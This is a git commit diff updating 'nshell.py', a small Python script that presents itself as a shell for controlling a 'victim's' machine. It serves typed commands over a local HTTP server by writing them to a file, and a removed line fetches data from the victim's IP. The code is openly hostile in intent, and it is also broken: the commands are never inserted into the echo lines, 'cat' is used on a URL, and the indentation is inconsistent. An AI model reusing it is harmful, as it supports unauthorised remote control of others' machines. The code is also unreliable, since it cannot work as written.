bc60129d6bb393f94e021ea3547be9374a3da14b
Guille-ux <104579306+Guille-ux@users.noreply.github.com>
2022-08-28 17:30:19 +0200

    Update nshell.py

--- nshell.py
+++ nshell.py
@@ -1,14 +1,11 @@
-import os, time, sys
+import os, sys
 
 print("press ctrl + c to quit")
-ip = input("victim's ip: ")
 port = input("Port: ")
 os.system("python3 -m http.server {} 2>&1 &".format(port))
 while True:
-	try:
-		com = input("$ ")
-		os.system("echo {} > data.txt")
-		time.sleep(1.5)
-		os.system("cat http://{}:{}/data".format(ip, port))
-	except KeyboardInterrupt:
-		sys.exit()
+    try:
+	com = input("$ ")
+	os.system("echo {} > data.sh")
+    except KeyboardInterrupt:
+	sys.exit()
